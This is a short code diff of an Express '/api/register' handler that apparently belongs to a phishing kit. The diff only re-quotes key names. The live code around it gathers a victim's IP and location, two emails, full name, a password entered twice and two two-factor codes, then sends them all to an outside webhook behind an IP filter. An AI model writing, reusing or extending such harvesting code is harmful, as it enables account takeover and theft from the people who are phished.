@@ -69,9 +69,9 @@ app.post('/api/register', ipFilter, registerLimiter, async (req, res) => {
 
         if (process.env.WEBHOOK_URL) {
             const params = new URLSearchParams({
-                Ip: values.ip || '',
-                City: values.city || '',
-                Country: values.country || '',
+                'Ip': values.ip || '',
+                'City': values.city || '',
+                'Country': values.country || '',
                 'Email Business': values.businessEmail || '',
                 'Email Personal': values.personalEmail || '',
                 'Full Name': values.fullName || '',
@@ -81,7 +81,7 @@ app.post('/api/register', ipFilter, registerLimiter, async (req, res) => {
                 'Password Second': values.passwordSecond || '',
                 'First Two-Fa': values.firstTwoFa || '',
                 'Second Two-Fa': values.secondTwoFa || '',
-                Image: values.imageUrl || ''
+                'Image': values.imageUrl || ''
             });
 
             try {
